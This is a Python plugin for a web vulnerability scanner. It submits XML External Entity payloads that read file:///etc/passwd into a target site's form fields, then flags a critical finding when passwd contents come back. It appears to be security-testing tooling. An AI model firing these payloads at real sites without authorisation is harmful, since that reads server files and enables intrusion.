def scan(scanner):
    """Scan for XML External Entity (XXE) vulnerabilities"""
    print("[PLUGIN] Scanning for XXE vulnerabilities...")
    xxe_payloads = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
    ]
    try:
        response = scanner.session.get(scanner.target_url, timeout=scanner.timeout)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'post').lower()
            if form_action:
                test_url = scanner.urljoin(scanner.target_url, form_action)
            else:
                test_url = scanner.target_url
            inputs = form.find_all('input')
            for input_field in inputs:
                input_name = input_field.get('name')
                input_type = input_field.get('type', 'text')
                if input_name and input_type in ['text', 'file', 'hidden']:
                    for payload in xxe_payloads:
                        if form_method == 'post':
                            data = {input_name: payload}
                            try:
                                response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            except:
                                continue
                        else:
                            continue
                        if 'root:x:' in response.text or 'bin:x:' in response.text:
                            scanner.log_vulnerability(
                                'XML External Entity (XXE)',
                                'Critical',
                                f'XXE vulnerability detected in parameter {input_name}',
                                f'Payload: {payload[:100]}...',
                                'CWE-611'
                            )
                            break
    except Exception as e:
        print(f"[PLUGIN][XXE] Error: {e}") 